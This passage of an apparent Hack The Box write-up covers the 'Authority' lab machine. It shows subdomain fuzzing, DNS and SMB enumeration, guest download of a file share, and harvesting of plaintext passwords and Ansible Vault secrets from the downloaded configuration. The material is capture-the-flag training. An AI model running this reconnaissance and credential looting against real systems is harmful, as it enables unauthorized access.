+<p>Visiting port 8443 gives us the domain name
+<img alt="directory.png" src="../../../../_images/directory.png" /></p>
+<p>Fuzzing that we get more subdomains</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">ffuf</span> \
+  <span class="o">-</span><span class="n">c</span> \
+  <span class="o">-</span><span class="n">w</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">20000.</span><span class="n">txt</span> \
+  <span class="o">-</span><span class="n">u</span> <span class="s2">&quot;http://authority.htb&quot;</span> \
+  <span class="o">-</span><span class="n">H</span> <span class="s2">&quot;Host: FUZZ.authority.htb&quot;</span> <span class="o">-</span><span class="n">mc</span> <span class="nb">all</span> <span class="o">-</span><span class="n">fs</span> <span class="mi">703</span>
+
+        <span class="o">/</span><span class="s1">&#39;___\  /&#39;</span><span class="n">___</span>\           <span class="o">/</span><span class="s1">&#39;___</span><span class="se">\</span>
+<span class="s1">       /\ \__/ /\ \__/  __  __  /\ \__/</span>
+       \ \ <span class="p">,</span><span class="n">__</span>\\ \ <span class="p">,</span><span class="n">__</span>\<span class="o">/</span>\ \<span class="o">/</span>\ \ \ \ <span class="p">,</span><span class="n">__</span>\
+        \ \ \<span class="n">_</span><span class="o">/</span> \ \ \<span class="n">_</span><span class="o">/</span>\ \ \<span class="n">_</span>\ \ \ \ \<span class="n">_</span><span class="o">/</span>
+         \ \<span class="n">_</span>\   \ \<span class="n">_</span>\  \ \<span class="n">____</span><span class="o">/</span>  \ \<span class="n">_</span>\
+          \<span class="o">/</span><span class="n">_</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>   \<span class="o">/</span><span class="n">___</span><span class="o">/</span>    \<span class="o">/</span><span class="n">_</span><span class="o">/</span>
+
+       <span class="n">v2</span><span class="mf">.0.0</span><span class="o">-</span><span class="n">dev</span>
+<span class="n">________________________________________________</span>
+
+ <span class="p">::</span> <span class="n">Method</span>           <span class="p">:</span> <span class="n">GET</span>
+ <span class="p">::</span> <span class="n">URL</span>              <span class="p">:</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Wordlist</span>         <span class="p">:</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">DNS</span><span class="o">/</span><span class="n">subdomains</span><span class="o">-</span><span class="n">top1million</span><span class="o">-</span><span class="mf">20000.</span><span class="n">txt</span>
+ <span class="p">::</span> <span class="n">Header</span>           <span class="p">:</span> <span class="n">Host</span><span class="p">:</span> <span class="n">FUZZ</span><span class="o">.</span><span class="n">authority</span><span class="o">.</span><span class="n">htb</span>
+ <span class="p">::</span> <span class="n">Follow</span> <span class="n">redirects</span> <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Calibration</span>      <span class="p">:</span> <span class="n">false</span>
+ <span class="p">::</span> <span class="n">Timeout</span>          <span class="p">:</span> <span class="mi">10</span>
+ <span class="p">::</span> <span class="n">Threads</span>          <span class="p">:</span> <span class="mi">40</span>
+ <span class="p">::</span> <span class="n">Matcher</span>          <span class="p">:</span> <span class="n">Response</span> <span class="n">status</span><span class="p">:</span> <span class="nb">all</span>
+ <span class="p">::</span> <span class="n">Filter</span>           <span class="p">:</span> <span class="n">Response</span> <span class="n">size</span><span class="p">:</span> <span class="mi">703</span>
+<span class="n">________________________________________________</span>
+
+<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">334</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">21</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">29</span><span class="n">ms</span><span class="p">]</span>
+    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="c1">#www</span>
+
+<span class="p">[</span><span class="n">Status</span><span class="p">:</span> <span class="mi">400</span><span class="p">,</span> <span class="n">Size</span><span class="p">:</span> <span class="mi">334</span><span class="p">,</span> <span class="n">Words</span><span class="p">:</span> <span class="mi">21</span><span class="p">,</span> <span class="n">Lines</span><span class="p">:</span> <span class="mi">7</span><span class="p">,</span> <span class="n">Duration</span><span class="p">:</span> <span class="mi">31</span><span class="n">ms</span><span class="p">]</span>
+    <span class="o">*</span> <span class="n">FUZZ</span><span class="p">:</span> <span class="c1">#mail</span>
+
+<span class="p">::</span> <span class="n">Progress</span><span class="p">:</span> <span class="p">[</span><span class="mi">19966</span><span class="o">/</span><span class="mi">19966</span><span class="p">]</span> <span class="p">::</span> <span class="n">Job</span> <span class="p">[</span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="p">]</span> <span class="p">::</span> <span class="mi">1162</span> <span class="n">req</span><span class="o">/</span><span class="n">sec</span> <span class="p">::</span> <span class="n">Duration</span><span class="p">:</span> <span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">16</span><span class="p">]</span> <span class="p">::</span> <span class="n">Errors</span><span class="p">:</span> <span class="mi">0</span> <span class="p">::</span>
+</pre></div>
+</div>
+<p>And we can now also talk to the dns server</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dig<span class="w"> </span>any<span class="w"> </span>authority.htb<span class="w"> </span>@10.10.11.222
+
+<span class="p">;</span><span class="w"> </span>&lt;&lt;&gt;&gt;<span class="w"> </span>DiG<span class="w"> </span><span class="m">9</span>.18.16-1-Debian<span class="w"> </span>&lt;&lt;&gt;&gt;<span class="w"> </span>any<span class="w"> </span>authority.htb<span class="w"> </span>@10.10.11.222
+<span class="p">;;</span><span class="w"> </span>global<span class="w"> </span>options:<span class="w"> </span>+cmd
+<span class="p">;;</span><span class="w"> </span>Got<span class="w"> </span>answer:
+<span class="p">;;</span><span class="w"> </span>-&gt;&gt;HEADER<span class="s">&lt;&lt;- opco</span>de:<span class="w"> </span>QUERY,<span class="w"> </span>status:<span class="w"> </span>NOERROR,<span class="w"> </span>id:<span class="w"> </span><span class="m">56135</span>
+<span class="p">;;</span><span class="w"> </span>flags:<span class="w"> </span>qr<span class="w"> </span>aa<span class="w"> </span>rd<span class="w"> </span>ra<span class="p">;</span><span class="w"> </span>QUERY:<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>ANSWER:<span class="w"> </span><span class="m">5</span>,<span class="w"> </span>AUTHORITY:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>ADDITIONAL:<span class="w"> </span><span class="m">4</span>
+
+<span class="p">;;</span><span class="w"> </span>OPT<span class="w"> </span>PSEUDOSECTION:
+<span class="p">;</span><span class="w"> </span>EDNS:<span class="w"> </span>version:<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>flags:<span class="p">;</span><span class="w"> </span>udp:<span class="w"> </span><span class="m">4000</span>
+<span class="p">;;</span><span class="w"> </span>QUESTION<span class="w"> </span>SECTION:
+<span class="p">;</span>authority.htb.<span class="w">                 </span>IN<span class="w">      </span>ANY
+
+<span class="p">;;</span><span class="w"> </span>ANSWER<span class="w"> </span>SECTION:
+authority.htb.<span class="w">          </span><span class="m">600</span><span class="w">     </span>IN<span class="w">      </span>A<span class="w">       </span><span class="m">10</span>.10.11.222
+authority.htb.<span class="w">          </span><span class="m">3600</span><span class="w">    </span>IN<span class="w">      </span>NS<span class="w">      </span>authority.authority.htb.
+authority.htb.<span class="w">          </span><span class="m">3600</span><span class="w">    </span>IN<span class="w">      </span>SOA<span class="w">     </span>authority.authority.htb.<span class="w"> </span>hostmaster.htb.corp.<span class="w"> </span><span class="m">174</span><span class="w"> </span><span class="m">900</span><span class="w"> </span><span class="m">600</span><span class="w"> </span><span class="m">86400</span><span class="w"> </span><span class="m">3600</span>
+authority.htb.<span class="w">          </span><span class="m">600</span><span class="w">     </span>IN<span class="w">      </span>AAAA<span class="w">    </span>dead:beef::9e
+authority.htb.<span class="w">          </span><span class="m">600</span><span class="w">     </span>IN<span class="w">      </span>AAAA<span class="w">    </span>dead:beef::3331:9963:2a3e:8edc
+
+<span class="p">;;</span><span class="w"> </span>ADDITIONAL<span class="w"> </span>SECTION:
+authority.authority.htb.<span class="w"> </span><span class="m">3600</span><span class="w">   </span>IN<span class="w">      </span>A<span class="w">       </span><span class="m">10</span>.10.11.222
+authority.authority.htb.<span class="w"> </span><span class="m">3600</span><span class="w">   </span>IN<span class="w">      </span>AAAA<span class="w">    </span>dead:beef::9e
+authority.authority.htb.<span class="w"> </span><span class="m">3600</span><span class="w">   </span>IN<span class="w">      </span>AAAA<span class="w">    </span>dead:beef::3331:9963:2a3e:8edc
+
+<span class="p">;;</span><span class="w"> </span>Query<span class="w"> </span>time:<span class="w"> </span><span class="m">32</span><span class="w"> </span>msec
+<span class="p">;;</span><span class="w"> </span>SERVER:<span class="w"> </span><span class="m">10</span>.10.11.222#53<span class="o">(</span><span class="m">10</span>.10.11.222<span class="o">)</span><span class="w"> </span><span class="o">(</span>TCP<span class="o">)</span>
+<span class="p">;;</span><span class="w"> </span>WHEN:<span class="w"> </span>Sun<span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:26:08<span class="w"> </span>IST<span class="w"> </span><span class="m">2023</span>
+<span class="p">;;</span><span class="w"> </span>MSG<span class="w"> </span>SIZE<span class="w">  </span>rcvd:<span class="w"> </span><span class="m">265</span>
+</pre></div>
+</div>
+<p>Enumerating SMB</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbmap<span class="w"> </span>-H<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-u<span class="w"> </span>guest
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>IP:<span class="w"> </span><span class="m">10</span>.10.11.222:445<span class="w">        </span>Name:<span class="w"> </span>authority.authority.htb
+<span class="w">        </span>Disk<span class="w">                                                    </span>Permissions<span class="w">     </span>Comment
+<span class="w">        </span>----<span class="w">                                                    </span>-----------<span class="w">     </span>-------
+<span class="w">        </span>ADMIN$<span class="w">                                                  </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Remote<span class="w"> </span>Admin
+<span class="w">        </span>C$<span class="w">                                                      </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Default<span class="w"> </span>share
+<span class="w">        </span>Department<span class="w"> </span>Shares<span class="w">                                       </span>NO<span class="w"> </span>ACCESS
+<span class="w">        </span>Development<span class="w">                                             </span>READ<span class="w"> </span>ONLY
+<span class="w">        </span>IPC$<span class="w">                                                    </span>READ<span class="w"> </span>ONLY<span class="w">       </span>Remote<span class="w"> </span>IPC
+<span class="w">        </span>NETLOGON<span class="w">                                                </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+<span class="w">        </span>SYSVOL<span class="w">                                                  </span>NO<span class="w"> </span>ACCESS<span class="w">       </span>Logon<span class="w"> </span>server<span class="w"> </span>share
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smbclient<span class="w">  </span>-U<span class="w"> </span>Guest<span class="w"> </span>--password<span class="o">=</span><span class="s2">&quot;&quot;</span><span class="w"> </span>//10.10.11.222/Development
+Try<span class="w"> </span><span class="s2">&quot;help&quot;</span><span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>list<span class="w"> </span>of<span class="w"> </span>possible<span class="w"> </span>commands.
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>ls
+<span class="w">  </span>.<span class="w">                                   </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Mar<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">13</span>:20:38<span class="w"> </span><span class="m">2023</span>
+<span class="w">  </span>..<span class="w">                                  </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Mar<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">13</span>:20:38<span class="w"> </span><span class="m">2023</span>
+<span class="w">  </span>Automation<span class="w">                          </span>D<span class="w">        </span><span class="m">0</span><span class="w">  </span>Fri<span class="w"> </span>Mar<span class="w"> </span><span class="m">17</span><span class="w"> </span><span class="m">13</span>:20:40<span class="w"> </span><span class="m">2023</span>
+</pre></div>
+</div>
+<p>Downloading all this locally</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mask<span class="w"> </span><span class="s2">&quot;&quot;</span>
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>recurse
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>prompt
+smb:<span class="w"> </span><span class="se">\&gt;</span><span class="w"> </span>mget<span class="w"> </span>*
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\A</span>DCS<span class="se">\.</span>ansible-lint<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">259</span><span class="w"> </span>as<span class="w"> </span>Automation/Ansible/ADCS/.ansible-lint<span class="w"> </span><span class="o">(</span><span class="m">2</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+getting<span class="w"> </span>file<span class="w"> </span><span class="se">\A</span>utomation<span class="se">\A</span>nsible<span class="se">\A</span>DCS<span class="se">\.</span>yamllint<span class="w"> </span>of<span class="w"> </span>size<span class="w"> </span><span class="m">205</span><span class="w"> </span>as<span class="w"> </span>Automation/Ansible/ADCS/.yamllint<span class="w"> </span><span class="o">(</span><span class="m">1</span>.9<span class="w"> </span>KiloBytes/sec<span class="o">)</span><span class="w"> </span><span class="o">(</span>average<span class="w"> </span><span class="m">2</span>.0<span class="w"> </span>KiloBytes/sec<span class="o">)</span>
+...SNIP...
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pwd</span>
+<span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">blnkn</span><span class="o">/</span><span class="n">sec</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">machines</span><span class="o">/</span><span class="n">authority</span><span class="o">/</span><span class="n">loot</span><span class="o">/</span><span class="n">Automation</span><span class="o">/</span><span class="n">Ansible</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ls<span class="w"> </span>-la
+total<span class="w"> </span><span class="m">24</span>
+drwxr-xr-x<span class="w">  </span><span class="m">6</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:36<span class="w"> </span>.
+drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:36<span class="w"> </span>..
+drwxr-xr-x<span class="w">  </span><span class="m">8</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:36<span class="w"> </span>ADCS
+drwxr-xr-x<span class="w"> </span><span class="m">10</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:36<span class="w"> </span>LDAP
+drwxr-xr-x<span class="w">  </span><span class="m">7</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:36<span class="w"> </span>PWM
+drwxr-xr-x<span class="w">  </span><span class="m">3</span><span class="w"> </span>blnkn<span class="w"> </span>blnkn<span class="w"> </span><span class="m">4096</span><span class="w"> </span>Jul<span class="w"> </span><span class="m">23</span><span class="w"> </span><span class="m">13</span>:36<span class="w"> </span>SHARE
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>tree<span class="w"> </span>-a<span class="w"> </span>.
+.
+├──<span class="w"> </span>ADCS
+│<span class="w">   </span>├──<span class="w"> </span>.ansible-lint
+│<span class="w">   </span>├──<span class="w"> </span>defaults
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>LICENSE
+│<span class="w">   </span>├──<span class="w"> </span>meta
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>main.yml
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>preferences.yml
+│<span class="w">   </span>├──<span class="w"> </span>molecule
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>default
+│<span class="w">   </span>│<span class="w">       </span>├──<span class="w"> </span>converge.yml
+│<span class="w">   </span>│<span class="w">       </span>├──<span class="w"> </span>molecule.yml
+│<span class="w">   </span>│<span class="w">       </span>└──<span class="w"> </span>prepare.yml
+│<span class="w">   </span>├──<span class="w"> </span>README.md
+│<span class="w">   </span>├──<span class="w"> </span>requirements.txt
+│<span class="w">   </span>├──<span class="w"> </span>requirements.yml
+│<span class="w">   </span>├──<span class="w"> </span>SECURITY.md
+│<span class="w">   </span>├──<span class="w"> </span>tasks
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>assert.yml
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>generate_ca_certs.yml
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>init_ca.yml
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>main.yml
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>requests.yml
+│<span class="w">   </span>├──<span class="w"> </span>templates
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>extensions.cnf.j2
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>openssl.cnf.j2
+│<span class="w">   </span>├──<span class="w"> </span>tox.ini
+│<span class="w">   </span>├──<span class="w"> </span>vars
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>└──<span class="w"> </span>.yamllint
+├──<span class="w"> </span>LDAP
+│<span class="w">   </span>├──<span class="w"> </span>.bin
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>clean_vault
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>diff_vault
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>smudge_vault
+│<span class="w">   </span>├──<span class="w"> </span>defaults
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>files
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>pam_mkhomedir
+│<span class="w">   </span>├──<span class="w"> </span>handlers
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>meta
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>README.md
+│<span class="w">   </span>├──<span class="w"> </span>tasks
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>templates
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>ldap_sudo_groups.j2
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>ldap_sudo_users.j2
+│<span class="w">   </span>│<span class="w">   </span>├──<span class="w"> </span>sssd.conf.j2
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>sudo_group.j2
+│<span class="w">   </span>├──<span class="w"> </span>TODO.md
+│<span class="w">   </span>├──<span class="w"> </span>.travis.yml
+│<span class="w">   </span>├──<span class="w"> </span>Vagrantfile
+│<span class="w">   </span>└──<span class="w"> </span>vars
+│<span class="w">       </span>├──<span class="w"> </span>debian.yml
+│<span class="w">       </span>├──<span class="w"> </span>main.yml
+│<span class="w">       </span>├──<span class="w"> </span>redhat.yml
+│<span class="w">       </span>└──<span class="w"> </span>ubuntu-14.04.yml
+├──<span class="w"> </span>PWM
+│<span class="w">   </span>├──<span class="w"> </span>ansible.cfg
+│<span class="w">   </span>├──<span class="w"> </span>ansible_inventory
+│<span class="w">   </span>├──<span class="w"> </span>defaults
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>handlers
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>meta
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>├──<span class="w"> </span>README.md
+│<span class="w">   </span>├──<span class="w"> </span>tasks
+│<span class="w">   </span>│<span class="w">   </span>└──<span class="w"> </span>main.yml
+│<span class="w">   </span>└──<span class="w"> </span>templates
+│<span class="w">       </span>├──<span class="w"> </span>context.xml.j2
+│<span class="w">       </span>└──<span class="w"> </span>tomcat-users.xml.j2
+└──<span class="w"> </span>SHARE
+<span class="w">    </span>└──<span class="w"> </span>tasks
+<span class="w">        </span>└──<span class="w"> </span>main.yml
+
+<span class="m">26</span><span class="w"> </span>directories,<span class="w"> </span><span class="m">52</span><span class="w"> </span>files
+</pre></div>
+</div>
+<p>Grepping around to find interesting things</p>
+<p>In ADCS</p>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="c1"># A passphrase for the CA key.</span>
+<span class="nt">ca_passphrase</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">SuP3rS3creT</span>
+</pre></div>
+</div>
+<p>In PWM</p>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nt">ansible_user</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">administrator</span>
+<span class="nt">ansible_password</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Welcome1</span>
+<span class="nt">ansible_port</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">5985</span>
+<span class="nt">ansible_connection</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">winrm</span>
+<span class="nt">ansible_winrm_transport</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ntlm</span>
+<span class="nt">ansible_winrm_server_cert_validation</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ignore</span>
+</pre></div>
+</div>
+<div class="highlight-yaml notranslate"><div class="highlight"><pre><span></span><span class="nn">---</span>
+<span class="nt">pwm_run_dir</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;{{</span><span class="nv"> </span><span class="s">lookup(&#39;env&#39;,</span><span class="nv"> </span><span class="s">&#39;PWD&#39;)</span><span class="nv"> </span><span class="s">}}&quot;</span>
+
+<span class="nt">pwm_hostname</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">authority.htb.corp</span>
+<span class="nt">pwm_http_port</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;{{</span><span class="nv"> </span><span class="s">http_port</span><span class="nv"> </span><span class="s">}}&quot;</span>
+<span class="nt">pwm_https_port</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;{{</span><span class="nv"> </span><span class="s">https_port</span><span class="nv"> </span><span class="s">}}&quot;</span>
+<span class="nt">pwm_https_enable</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">true</span>
+
+<span class="nt">pwm_require_ssl</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
+
+<span class="nt">pwm_admin_login</span><span class="p">:</span><span class="w"> </span><span class="kt">!vault</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">          </span><span class="no">$ANSIBLE_VAULT;1.1;AES256</span>
+<span class="w">          </span><span class="no">32666534386435366537653136663731633138616264323230383566333966346662313161326239</span>
+<span class="w">          </span><span class="no">6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span>
+<span class="w">          </span><span class="no">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span>
+<span class="w">          </span><span class="no">6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span>
+<span class="w">          </span><span class="no">3438</span>
+
+<span class="nt">pwm_admin_password</span><span class="p">:</span><span class="w"> </span><span class="kt">!vault</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">          </span><span class="no">$ANSIBLE_VAULT;1.1;AES256</span>
+<span class="w">          </span><span class="no">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span>
+<span class="w">          </span><span class="no">3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span>
+<span class="w">          </span><span class="no">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span>
+<span class="w">          </span><span class="no">3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span>
+<span class="w">          </span><span class="no">6531</span>
+
+<span class="nt">ldap_uri</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ldap://127.0.0.1/</span>
+<span class="nt">ldap_base_dn</span><span class="p">:</span><span class="w"> </span><span class="s">&quot;DC=authority,DC=htb&quot;</span>
+<span class="nt">ldap_admin_password</span><span class="p">:</span><span class="w"> </span><span class="kt">!vault</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">          </span><span class="no">$ANSIBLE_VAULT;1.1;AES256</span>
+<span class="w">          </span><span class="no">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span>
+<span class="w">          </span><span class="no">3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span>
+<span class="w">          </span><span class="no">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span>
+<span class="w">          </span><span class="no">3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span>
+<span class="w">          </span><span class="no">3764</span>
+</pre></div>
+</div>
+<div class="highlight-xml notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?xml version=&#39;1.0&#39; encoding=&#39;cp1252&#39;?&gt;</span>
+
+<span class="nt">&lt;tomcat-users</span><span class="w"> </span><span class="na">xmlns=</span><span class="s">&quot;http://tomcat.apache.org/xml&quot;</span><span class="w"> </span><span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span>
+<span class="w"> </span><span class="na">xsi:schemaLocation=</span><span class="s">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span>
+<span class="w"> </span><span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
+
+<span class="nt">&lt;user</span><span class="w"> </span><span class="na">username=</span><span class="s">&quot;admin&quot;</span><span class="w"> </span><span class="na">password=</span><span class="s">&quot;T0mc@tAdm1n&quot;</span><span class="w"> </span><span class="na">roles=</span><span class="s">&quot;manager-gui&quot;</span><span class="nt">/&gt;</span>
+<span class="nt">&lt;user</span><span class="w"> </span><span class="na">username=</span><span class="s">&quot;robot&quot;</span><span class="w"> </span><span class="na">password=</span><span class="s">&quot;T0mc@tR00t&quot;</span><span class="w"> </span><span class="na">roles=</span><span class="s">&quot;manager-script&quot;</span><span class="nt">/&gt;</span>
+
+<span class="nt">&lt;/tomcat-users&gt;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>./ldapsearch-ad.py<span class="w"> </span>-l<span class="w"> </span><span class="m">10</span>.10.11.222<span class="w"> </span>-t<span class="w"> </span>info
+<span class="c1">### Server infos ###</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Forest<span class="w"> </span>functionality<span class="w"> </span><span class="nv">level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">2016</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>functionality<span class="w"> </span><span class="nv">level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">2016</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Domain<span class="w"> </span>controller<span class="w"> </span>functionality<span class="w"> </span><span class="nv">level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">2016</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">rootDomainNamingContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">DC</span><span class="o">=</span>authority,DC<span class="o">=</span>htb
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span><span class="nv">defaultNamingContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">DC</span><span class="o">=</span>authority,DC<span class="o">=</span>htb
